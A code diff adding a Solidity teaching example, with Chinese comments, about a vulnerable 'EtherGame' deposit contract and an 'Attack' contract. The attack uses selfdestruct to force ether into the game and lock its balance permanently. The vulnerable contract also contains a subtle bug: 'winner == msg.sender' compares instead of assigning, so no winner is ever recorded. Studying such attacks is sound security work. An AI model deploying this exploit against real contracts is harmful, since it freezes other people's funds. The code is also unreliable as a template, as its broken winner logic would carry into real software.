@@ -1,0 +1,38 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+contract EtherGame {
+    uint public targetAmount = 50 ether;
+    address public winner;
+
+    function deposit() public payable {
+        //存款函数
+        require(msg.value == 10 ether, "you can only send 10 ether");
+        uint balance = address(this).balance;
+        require(balance <= targetAmount, "game is over");
+        if(balance == targetAmount) {
+            //如果合约余额等于50ether这个赢家就是调用者
+            winner == msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        //领钱，检查调用者是不是winner
+        require(msg.sender == winner, "not winner");
+
+        (bool sent,) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "failed to sent");
+    }
+    function getBalance() public view returns(uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    //原理就是强制发送ether到要攻击的合约里面，因为要产生winner至少要发送10ether
+    //所以我们可以发送50ether到攻击的合约，就能把里面的钱卡住
+    function attack(address payable target) public payable {
+        selfdestruct(target);
+
+    }
+}
